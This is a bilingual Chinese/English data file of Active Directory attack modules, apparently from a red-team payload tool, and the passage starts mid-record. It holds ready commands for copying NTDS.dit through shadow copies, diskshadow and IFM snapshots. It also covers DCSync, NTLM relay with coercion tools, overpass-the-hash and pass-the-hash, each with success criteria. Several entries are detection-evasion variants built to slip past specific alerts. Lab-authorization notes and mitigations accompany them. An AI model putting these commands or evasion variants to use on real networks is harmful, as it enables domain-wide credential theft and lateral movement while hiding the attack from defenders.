      Where-Object { $_.Message -match "1131f6aa|1131f6ad" }
    修复后重放第 4、5 步，未授权复制应被拒绝并触发高等级告警。
mitigation.en: Prune domain-controller local administrators and delegate replication on demand, with monitoring alerts on DCSync and shadow operations. After the fix, replay steps 4 and 5: unauthorized replication should be denied with high-severity alerts.

title.zh: 用 ntdsutil 制作 IFM 快照
title.en: Create an IFM snapshot with ntdsutil

description.zh: 以 ntdsutil 的 IFM 模式创建安装介质快照；temp 目录生成含 ntds.dit 与 SYSTEM 的目录即拿到域库副本，且操作形式与合法备份一致、隐蔽性高。
description.en: Build an IFM snapshot via ntdsutil; the output folder holding ntds.dit and SYSTEM is a domain-store copy disguised as routine backup activity.

title.zh: 卷影副本直接复制域库
title.en: Copy the store via shadow copy

description.zh: 创建卷影副本并从 HarddiskVolumeShadowCopy 路径复制 NTDS.dit 与 SYSTEM；文件落盘即绕过域库运行时的独占锁定，备好离线解析材料。
description.en: Spin up a shadow copy and pull NTDS.dit plus SYSTEM from the HarddiskVolumeShadowCopy path; files landing on disk bypass the runtime lock for offline parsing.

attackChain.payload: vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

description.zh: 用 secretsdump.py 以 ntds 与 system 参数离线解析域库；输出全部域账户的 NTLM 哈希即完成域凭据整体收割，可逐个尝试哈希传递。
description.en: Parse the store offline with secretsdump.py -ntds -system LOCAL; the full NTLM set for every domain account completes wholesale credential harvesting.

description.zh: 用 secretsdump.py 的 just-dc 模式通过目录复制协议直接向域控拉取；无需落地域库文件，拿到 krbtgt 哈希即具备铸造黄金票据的原料。
description.en: Invoke -just-dc to pull via the directory replication protocol; no file drop needed, and the krbtgt hash is the golden-ticket ingredient.

title.en: Dump all domain hashes with mimikatz

description.zh: 用 mimikatz 的 dcsync 全量模式模拟域控间复制拉取全部账号哈希；与第 4 步互为备份通道，任一成功即完成全域凭据控制。
description.en: Run lsadump::dcsync /all to imitate inter-DC replication and pull every hash; as a backup to step 4, either channel succeeding means full domain credential control.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 NTDS.dit 备份与访问边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTDS.dit Backup and Access-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: NTDS.dit 备份与访问边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTDS.dit Backup and Access-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: NTDS.dit 与 DCSync 输出含全部域哈希（含 krbtgt），属最高敏感级材料——离线工作目录加密保存、用后粉碎；复制操作触发 4662 审计，须在授权窗口内执行。
opsecTips.en: NTDS.dit and DCSync output carry every domain hash including krbtgt — keep the offline workspace encrypted and shred it afterwards, and run replication inside the authorized window since it emits 4662 audit events.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command: (echo set context volatile nowriters & echo add volume C: alias myshadow & echo create & echo expose %myshadow% Z: & echo exec "cmd /c copy Z:\Windows\NTDS\NTDS.dit C:\Windows\Temp\n.dit" & echo reset) > C:\Windows\Temp\ds.txt && diskshadow.exe /s C:\Windows\Temp\ds.txt

description.zh: 绕过 vssadmin 创建影子副本的进程特征：diskshadow 脚本化完成同等的卷影复制与提取。成功判据：n.dit 生成且可被 secretsdump 解析。
description.en: Evades vssadmin shadow-copy process signatures by scripting the same copy+extract flow through diskshadow. Success: n.dit is produced and parses with secretsdump.

explanation.zh: 易失卷影上下文（nowriters 为合法关键字）
explanation.en: volatile shadow context (nowriters is the valid keyword)

title.zh: 最小权限 DCSync 规避变体

description.zh: 绕过全库转储的体量告警（海量 replsecret 事件）：仅同步单目标账号。成功判据：dcs.txt 仅含目标账号哈希。
description.en: Evades full-database volume alerts (mass replsecret events) by syncing only one targeted account. Success: dcs.txt contains only the target's hashes.

title.zh: IFM 备份通道规避变体

description.zh: 绕过直接读取 NTDS.dit 的文件审计：走安装媒体（IFM）合法备份通道产出库文件。成功判据：ifm 目录含 ntds.dit 与 SYSTEM hive。
description.en: Evades direct NTDS.dit read auditing by using the installable-media (IFM) backup channel. Success: the ifm folder contains ntds.dit plus the SYSTEM hive.

description.zh: 用 ntdsutil 创建 IFM 快照；c:\temp 下生成包含 ntds.dit 的快照目录即成功。
description.en: Create the IFM snapshot with ntdsutil; a snapshot directory containing ntds.dit under c:\temp means success.

execution.command: vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

description.zh: 从卷影副本复制 NTDS.dit；目标路径生成 ntds.dit 即复制成功。
description.en: Copy NTDS.dit from the shadow copy; ntds.dit generated at the target path means the copy succeeded.

description.zh: 用 Impacket secretsdump.py 离线解析 NTDS.dit；输出域账户哈希即解析成功。
description.en: Parse NTDS.dit offline with Impacket secretsdump.py; printed domain-account hashes mean parsing succeeded.

title.zh: 远程 DCSync 导出域哈希

description.zh: 用 Impacket secretsdump.py 以 -just-dc 模式从域控远程同步账号哈希数据。
description.en: Uses Impacket secretsdump.py in -just-dc mode to remotely replicate account hash data from the domain controller.

title.zh: mimikatz DCSync 复制目录数据

description.zh: 用 mimikatz lsadump::dcsync 模拟域控复制流程拉取全部账号哈希。
description.en: Uses mimikatz lsadump::dcsync to pull all account hashes by emulating domain-controller replication.

name.zh: NTLM Relay 协议边界验证

description.zh: 把捕获的 NTLM 认证中继到 SMB/HTTP/LDAP 目标，验证 SMB 签名与 EPA 配置的中继面。
description.en: Captures an NTLM authentication and relays it to SMB, HTTP, or LDAP targets, verifying that SMB signing and EPA channel binding actually block relay to each protocol.

overview.zh: NTLM Relay 协议边界验证覆盖认证中继场景：针对 SMB/LDAP 未强制签名或 EPA 的内网环境，验证能否把截获的 NTLM 认证转发到第三台主机完成越权操作。验证维度涵盖 Responder 捕获、SMB 中继、LDAP 中继提权与 IPv6 DNS 劫持组合四种路径。
overview.en: NTLM Relay Protocol-Boundary Validation covers authentication relaying: in intranets where SMB/LDAP do not enforce signing or EPA, verify whether captured NTLM authentication can be forwarded to a third host for unauthorized operations. Verification dimensions cover Responder capture, SMB relay, LDAP relay privilege escalation, and an IPv6 DNS hijack combination.

vulnerability.zh: 根因是 NTLM 认证不绑定目标服务，签名与通道绑定未强制时，攻击者可把受害者发出的认证原样转发给第三台主机并以其身份执行操作；中继到 LDAP 还能借 ACL 修改或 ADCS 注册直接提升为域级权限。
vulnerability.en: The root cause is that NTLM authentication is not bound to the target service; without enforced signing and channel binding, an attacker forwards the victim's authentication verbatim to a third host and acts as that identity; relaying into LDAP can even escalate to domain-level rights via ACL modification or ADCS enrollment.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在隔离网段运行 Responder 监听，控制台打印捕获的 NTLMv2 Hash 即确认认证可截获；第 2 步用 ntlmrelayx 中继到 SMB 目标，打印 RELAY 成功并列出目标可写共享；第 3 步中继到 LDAP 并 --escalate-user，目标账号获得提升且 DC 记录 4662 目录变更；第 4 步组合 mitm6 应答 IPv6 DNS，把 LDAP 写入送达域控。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs Responder on an isolated segment — printed NTLMv2 hashes confirm interception; step 2 relays to an SMB target with ntlmrelayx — RELAY success lines plus writable-share enumeration; step 3 relays into LDAP with --escalate-user — the account is escalated and the DC logs 4662 directory changes; step 4 pairs mitm6 answering IPv6 DNS to push the LDAP write through to the DC. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
全域强制 SMB/LDAP 签名与通道绑定，禁用不必要 NTLM 与 IPv6，对 DNS 变更与 4662 告警：
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LDAPServerIntegrity /t REG_DWORD /d 2 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f
    修复后用第 2、3 步回归，中继应被签名/通道绑定错误拒绝。
mitigation.en: Enforce SMB signing, LDAP signing, and channel binding (EPA) domain-wide; disable NTLM or confine it to protected channels, disable unnecessary IPv6 with alerts on DNS record changes, and monitor 4662 directory changes and abnormal auth chains. After the fix, regress with the step 2 and step 3 samples: relays must be rejected with signing/channel-binding errors.

description.zh: 启动 Responder 监听 eth0 并开启 WPAD 等欺骗；控制台持续输出挑战响应即认证流量已被劫持捕获。
description.en: Start Responder on eth0 with WPAD poisoning; challenge-response lines streaming on the console mean authentication traffic is being captured.

title.zh: 中继认证到 SMB 目标

description.zh: 运行 ntlmrelayx.py -tf targets.txt -smb2support；目标回吐 SAM 哈希转储即认证中继成功，全程无需破解口令。
description.en: Run ntlmrelayx.py -tf targets.txt -smb2support; SAM hashes dumped from targets confirm the relay worked without cracking anything.

title.zh: 中继到 LDAP 提升域权限
title.en: Escalate in the domain via LDAP relay

description.zh: 把中继目标切到 ldap://DC 并加 --escalate-user；回显用户被加入高权限组或获得敏感 ACL 即完成域内提权。
description.en: Point the relay at ldap://DC with --escalate-user; the user landing in a privileged group or gaining a sensitive ACL completes domain escalation.

title.zh: IPv6 接管无人值守中继

description.zh: 用 mitm6 接管 DHCPv6 再中继到 LDAP；捕获机器账号认证并控制计算机对象即覆盖无 WPAD 的网段。
description.en: Take over DHCPv6 with mitm6 and relay into LDAP; machine-account captures with computer-object control extend reach to segments without WPAD.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 NTLM Relay 协议边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTLM Relay Protocol-Boundary Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: NTLM Relay 协议边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM Relay Protocol-Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 中继监听与强制认证只在隔离网段进行，不对生产夹具发起 coerced 认证；中继建立的会话验证后立即注销。
opsecTips.en: Run relay listeners and coerced authentications only on the isolated segment, never coerce production fixtures, and tear down relayed sessions immediately after verification.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: SOCKS 长驻低噪规避变体

description.zh: 绕过一次性转储触发的集中告警：中继凭证入 SOCKS 池供后续按需使用，减少批量 SAM 转储特征。成功判据：SOCKS 列表出现可用凭证且无即时转储行为。
description.en: Evades central alerting on one-shot dumps by parking relayed creds in a SOCKS pool for on-demand reuse, removing bulk SAM-dump signatures. Success: SOCKS list shows usable creds with no immediate dump.

title.zh: HTTP 目标多元规避变体

description.zh: 绕过 SMB 中继专用检测（针对 445 转储特征）：改经 HTTP 端口中继到多目标，流量形态为 Web。成功判据：多目标认证成功记录。
description.en: Evades SMB-relay-specific detection (445 dump signatures) by relaying over HTTP to multiple targets so traffic looks like web. Success: successful auth records for multiple targets.

title.zh: 强制认证源轮换规避变体

wafBypass.command: python3 petitpotam.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}; python3 printerbug.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST} {LAB_OPERATOR_HOST}; python3 dfscoerce.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}

description.zh: 绕过针对单一强制工具（如仅监控 PetitPotam CLSID）的检测：轮换 printerbug/dfscoerce 触发认证。成功判据：任一工具使目标回连操作机。
description.en: Evades detection pinned to a single coercion primitive (e.g. PetitPotam CLSID only) by rotating printerbug/dfscoerce to trigger auth. Success: any tool makes the target call back to the operator host.

title.zh: HTTP 端口伪装规避变体

description.zh: 绕过 445/3389 端口中继的定向监控：中继监听落在 80，流量呈现为普通 Web。成功判据：HTTP 目标认证成功入 SOCKS。
description.en: Evades directed monitoring of 445/3389 relaying by listening on port 80 so traffic looks like ordinary web. Success: HTTP target authenticates into SOCKS.

title.zh: PrinterBug 强制轮换规避变体

description.zh: 绕过 PetitPotam 特征（特定 CLSID/RPC UUID 监控）：换打印机通知回调触发认证。成功判据：目标向操作机发起认证。
description.en: Evades PetitPotam signatures (specific CLSID/RPC UUID monitoring) by triggering auth via the printer notification callback instead. Success: the target authenticates toward the operator host.

description.zh: 在隔离网段运行 Responder 捕获 NTLM 认证；成功时控制台打印捕获到的 SMB/HTTP NTLMv2 Hash 条目。
description.en: Run Responder in the isolated segment to capture NTLM authentication; the console printing captured SMB/HTTP NTLMv2 hash entries confirms success.

explanation.zh: -w 启用 WPAD 代理应答，-r 应答 wredir 后缀查询，-f 对发问主机做指纹识别（不存在 FTP 服务选项）
explanation.en: -w enables WPAD proxy answers, -r answers wredir suffix queries, and -f fingerprints querying hosts (there is no FTP service option)

title.zh: 中继认证枚举 SMB 可写
title.en: NTLM Relay Protocol-Boundary Validation Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_2 与蓝队日志；成功时 ntlmrelayx 打印转发认证成功记录并列出目标 SMB 可写状态。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_2 with blue-team logs; ntlmrelayx printing a successful relay record with target SMB status confirms success.

title.zh: 中继 LDAP 提升用户权限
title.en: NTLM Relay Protocol-Boundary Validation Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_3 与蓝队日志；成功时 --escalate-user 指定的现有用户在 LDAP 中获得提权 ACL/组成员变更，DC 事件 4662 记录目录对象修改。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_3 with blue-team logs; the escalated user appearing in LDAP with DC event 4662 recording the directory change confirms success.

title.zh: mitm6 劫持 DNS 中继 LDAPS
title.en: NTLM Relay Protocol-Boundary Validation Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_4 与蓝队日志；成功时 mitm6 应答 IPv6 DNS 且转发到域控的 LDAP 写入成功。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_4 with blue-team logs; mitm6 answering IPv6 DNS and the LDAP relay to the DC writing successfully confirms success.

name.zh: Overpass-the-Hash 换取 TGT

description.zh: 用 NTLM 哈希向 KDC 换取 Kerberos TGT，验证哈希到票据的协议转换边界。
description.en: Exchanges a stolen NTLM hash for a Kerberos TGT through pre-authentication, demonstrating that under RC4-enabled domains hash disclosure equals password disclosure.

overview.zh: NTLM 到 Kerberos 票据边界审计覆盖 Overpass-the-Hash 场景：针对已获取 NTLM 哈希的测试主体，验证能否把哈希转换为完整 Kerberos 票据并以域身份访问资源。验证维度涵盖 mimikatz /ptt 注入、Rubeus RC4 申请 TGT 与 Impacket getTGT 三条路径。
overview.en: NTLM-to-Kerberos Ticket-Boundary Audit covers Overpass-the-Hash: for a test principal holding an NTLM hash, verify whether the hash converts into full Kerberos tickets granting domain identity access. Verification dimensions cover mimikatz /ptt injection, Rubeus RC4 TGT requests, and Impacket getTGT.

vulnerability.zh: 根因是域允许 RC4 加密类型时，NTLM 哈希可直接参与 Kerberos 预认证计算向 KDC 申请合法 TGT；攻击者无需明文口令即获得完整域身份，哈希泄露因此在 Kerberos 环境下等价于口令泄露。
vulnerability.en: The root cause is that when the domain permits RC4 encryption types, the NTLM hash feeds directly into Kerberos pre-authentication to request a legitimate TGT from the KDC; the attacker gains a full domain identity without the plaintext, so hash leakage equals password leakage in Kerberos environments.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 sekurlsa::pth /ptt 注入票据并启动新进程，klist 显示目标用户 TGT 即确认成功；第 2 步用 Rubeus asktgt /rc4 申请 TGT 并注入当前会话，可访问域资源即确认转换可用；第 3 步用 getTGT.py 写出 ccache 票据文件，配合 KRB5CCNAME 在跨平台环境验证。三条路径成功判据一致：以目标身份取得可用域票据。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 injects a ticket with sekurlsa::pth /ptt and spawns a new process — the target user's TGT in klist confirms success; step 2 requests a TGT with Rubeus asktgt /rc4 and injects it into the current session — domain resource access confirms the conversion works; step 3 writes a ccache ticket file with getTGT.py and validates cross-platform via KRB5CCNAME. All three share one success criterion: a usable domain ticket as the target identity. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
域功能级别提升后强制 AES Kerberos，禁用 RC4/DES 加密类型，敏感账号入保护组，监控 4768 RC4 etype 告警：
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters /v SupportedEncryptionTypes /t REG_DWORD /d 24 /f
    Set-ADUser svc_user -Replace @{'msDS-SupportedEncryptionTypes'=24}
    Add-ADGroupMember "Protected Users" -Members svc_user
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768} | ? Message -match "0x17"
    修复后用第 2 步回归，RC4 预认证应被 KDC 直接拒绝。
mitigation.en: Raise the domain functional level to enforce AES Kerberos, disable RC4/DES encryption types, and enable protected groups and account isolation for sensitive accounts; alert on RC4-encrypted TGT requests in 4768. After the fix, regress with the step 2 sample: RC4 pre-authentication must be rejected by the KDC.

title.zh: 哈希换取 Kerberos 票据
title.en: Convert a hash into Kerberos tickets

description.zh: 用 sekurlsa::pth /ptt 将 NTLM 哈希转为票据注入内存；新会话 klist 可见 TGT 即以 Kerberos 身份活动、绕开 NTLM 限制。
description.en: Use sekurlsa::pth /ptt to turn the NTLM hash into an injected ticket; a TGT visible via klist means you now act over Kerberos, bypassing NTLM restrictions.

title.zh: Rubeus 请求 TGT 注入
title.en: Request and inject a TGT with Rubeus

description.zh: 用 Rubeus asktgt /rc4:哈希 请求 TGT 并以 /ptt 注入；票据列表刷新即完成身份转换，适用禁用 NTLM 的环境。
description.en: Request a TGT with Rubeus asktgt /rc4:<hash> and inject with /ptt; the refreshed ticket list completes the identity shift for NTLM-disabled environments.

description.zh: Linux 侧用 getTGT.py 以哈希获取 TGT；导出 ccache 并设置 KRB5CCNAME 后即可用 -k 参数横向到其他域内主机。
description.en: On Linux use getTGT.py with the hash; exporting the ccache and setting KRB5CCNAME enables -k tooling to move laterally to other domain hosts.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 NTLM 到 Kerberos 票据边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTLM-to-Kerberos Ticket-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: NTLM 到 Kerberos 票据边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM-to-Kerberos Ticket-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 换取的 TGT 进入 lsass 缓存——验证后执行票据清除；RC4 换票请求在域控留 4768 事件，须在授权窗口内进行。
opsecTips.en: The exchanged TGT lands in the lsass cache — purge tickets afterwards; RC4 ticket requests leave 4768 events on the DC, so stay inside the authorized window.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 RC4(etype23) 票据请求的弱加密告警：改用 AES256 密钥请求，票据类型为强加密。成功判据：TGT 注入且事件中 etype 为 0x12。
description.en: Evades weak-encryption alerts on RC4 (etype23) ticket requests by requesting with an AES256 key so the ticket uses strong crypto. Success: TGT injected and events show etype 0x12.

title.zh: getTGT 密钥变形规避变体

description.zh: 绕过哈希请求特征：以 AES 密钥形态离线取票，流量仅为标准 AS-REQ。成功判据：生成 ccache 且无 etype23 出现。
description.en: Evades hash-request signatures by fetching the ticket offline with the AES key, leaving only standard AS-REQ traffic. Success: ccache generated with no etype23 present.

title.zh: ccache 环境注入规避变体

description.zh: 绕过票据导入的工具特征（ptt/文件操作）：以 ccache 环境变量方式让标准工具自动取票。成功判据：klist 显示票据且 smbclient 访问成功。
description.en: Evades ticket-import tooling signatures (ptt/file operations) by pointing KRB5CCNAME at the ccache so standard tools pick it up automatically. Success: klist shows the ticket and smbclient access works.

title.zh: 哈希换取 TGT 注入

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_OVERPASS_THE_HASH_E_1 与蓝队日志；成功时 sekurlsa::pth 注入票据并启动新进程，klist 显示目标用户 TGT。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_OVERPASS_THE_HASH_E_1 with blue-team logs; sekurlsa::pth injecting the ticket and spawning a new process with klist showing the target-user TGT confirms success.

title.zh: Rubeus 申请 TGT 注入

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_OVERPASS_THE_HASH_E_2 与蓝队日志；成功时 Rubeus 申请 TGT 并注入当前会话，可访问域资源。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_OVERPASS_THE_HASH_E_2 with blue-team logs; Rubeus requesting and injecting a TGT able to reach domain resources confirms success.

title.zh: getTGT 导出 ccache 票据

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_OVERPASS_THE_HASH_E_3 与蓝队日志；成功时 getTGT.py 写出 ccache 票据文件。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_OVERPASS_THE_HASH_E_3 with blue-team logs; getTGT.py writing the ccache ticket file confirms success.

name.zh: Pass-the-Hash 哈希传递

description.zh: 以窃取的 NTLM 哈希直接完成认证（pth 工具链），验证 NTLM 禁用策略与哈希传递防护。
description.en: Authenticates directly with a stolen NTLM hash through the pth toolchain instead of the password, verifying that NTLM is disabled or constrained and that hash reuse across machines is contained.

overview.zh: NTLM Hash 登录防护验证覆盖哈希传递场景：针对已获取 NTLM 哈希但无明文口令的测试主体，验证能否以哈希直接完成认证并访问目标。验证维度涵盖 psexec 远程执行、crackmapexec 批量验证、sekurlsa::pth 进程注入与 PowerShell SMB 客户端四种利用面。
overview.en: NTLM Hash Logon Protection Validation covers pass-the-hash: for a test principal holding an NTLM hash without the plaintext password, verify whether the hash alone authenticates and grants access. Verification dimensions cover psexec remote execution, crackmapexec batch validation, sekurlsa::pth process injection, and a PowerShell SMB client.

vulnerability.zh: 根因是 NTLM 协议把哈希本身当作认证凭据，响应由 NTLM 哈希直接参与计算，任何拿到哈希的主体无需破解即可完成认证；未启用 SMB 签名与账号隔离时，本地管理员哈希跨机复用进一步放大横向移动前景。
vulnerability.en: The root cause is that the NTLM protocol treats the hash itself as the credential — the challenge response is computed directly from the NTLM hash — so anyone holding it authenticates without cracking; without SMB signing and account isolation, cross-machine reuse of local-admin hashes further amplifies lateral movement prospects.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 psexec.py -hashes 直接开 shell，目标出现 4624 网络登录（LogonType 3）即确认成功；第 2 步用 crackmapexec smb 验证哈希有效性，返回 Pwn3d! 即确认具备本地管理员权限；第 3 步用 sekurlsa::pth 启动携带注入凭据的新进程访问域资源（本机 4624 表现为 NewCredentials 类型）；第 4 步用 Invoke-SMBClient 以哈希经 -Source \\{LAB_HOST}\admin$ 列出共享内容。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 opens a shell directly with psexec.py -hashes — a 4624 NewCredentials logon on the target confirms success; step 2 validates the hash with crackmapexec smb — Pwn3d! output confirms local administrator rights; step 3 uses sekurlsa::pth to launch a new process carrying the injected credential and reach domain resources; step 4 lists target shares with Invoke-SMBClient using the hash. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
启用 SMB 签名与 EPA，本地管理员隔离（禁止跨机复用、LAPS 随机化），对敏感账号拒绝 NTLM 并审计 4624 NewCredentials 登录：
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RestrictReceivingNTLMTraffic /t REG_DWORD /d 2 /f
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name NoLMHash -Value 1
    修复后用第 1、2 步样例回归，哈希认证应被目标直接拒绝。
mitigation.en: Enable SMB signing and EPA, enforce local-admin isolation (no cross-machine reuse, LAPS randomization), disable NTLM for sensitive accounts, and audit 4624 NewCredentials logons. After the fix, regress with the step 1 and step 2 samples: hash authentication must be rejected by the target.

title.zh: 哈希批量喷洒圈定范围
title.en: Spray hashes to map reachable hosts

description.zh: 用 crackmapexec smb 携带 NTLM 哈希批量喷洒网段；标注 Pwn3D! 的主机清单即哈希可横行的目标范围。
description.en: Spray the segment with crackmapexec smb using the NTLM hash; hosts flagged Pwn3D! define where the hash grants access.

title.zh: 哈希直连拿下首个立足点
title.en: Claim the first foothold with the hash

description.zh: 对命中主机用 psexec.py -hashes 登录；返回 SYSTEM shell 即拿到域内首个受控节点，后续以此为跳板。
description.en: Log into a hit host with psexec.py -hashes; a SYSTEM shell is the first controlled node and the pivot for what follows.

title.zh: 注入哈希伪造登录会话
title.en: Forge a logon session with the hash

description.zh: 本机运行 mimikatz sekurlsa::pth 弹出新凭据进程；在该会话内直接访问目标资源即以哈希完成身份伪装。
description.en: Run mimikatz sekurlsa::pth locally to spawn a credentialed process; accessing targets from that session impersonates the identity with just the hash.

title.en: Access restricted shares with the hash

description.zh: 用 Invoke-SMBClient 以哈希连接目标并列出目录；成功读写文件即确认哈希对 SMB 资源完整有效，可拖取敏感文档。
description.en: Connect with Invoke-SMBClient using the hash and list shares; successful read/write confirms the hash fully works against SMB and sensitive files can be pulled.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 哈希等同口令——会话结束立即从工具缓存与内存清出哈希材料；单哈希单目标验证，避免全网段喷洒触发 4625 锁定。
opsecTips.en: Hashes are password-equivalent — flush them from tool caches and memory when done, and validate one hash against one target to avoid 4625 lockout storms across the segment.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 换 smbmap 工具面做递归共享枚举：NTLM 哈希以空 LM 形态（:NTLM）直传、无明文口令，Python 单文件客户端与 Invoke-SMBClient 形成工具链差异，规避针对特定 PowerShell 模块加载的检测。判据：递归列出 admin$ 内容。
description.en: Swap the toolchain to smbmap for recursive share enumeration: the NTLM hash passes directly in empty-LM form with no plaintext password, and the single-file Python client differs from Invoke-SMBClient, dodging module-load-specific detections. Success: recursive admin$ listing returns.

description.zh: 绕过执行类告警（服务创建/进程启动）：先用哈希仅做共享枚举验证可用性，不触发载荷执行。成功判据：返回 [+] 认证成功与共享清单。
description.en: Evades execution alerts (service creation/process start) by validating the hash via share enumeration only, with no payload execution. Success: returns [+] access granted plus the share list.

description.zh: 绕过 NTLM 中继检测与 NTLM 事件告警：先把哈希换成 Kerberos TGT 再访问，流量呈现为标准 Kerberos。成功判据：dir 列出共享且网络流量为 Kerberos。
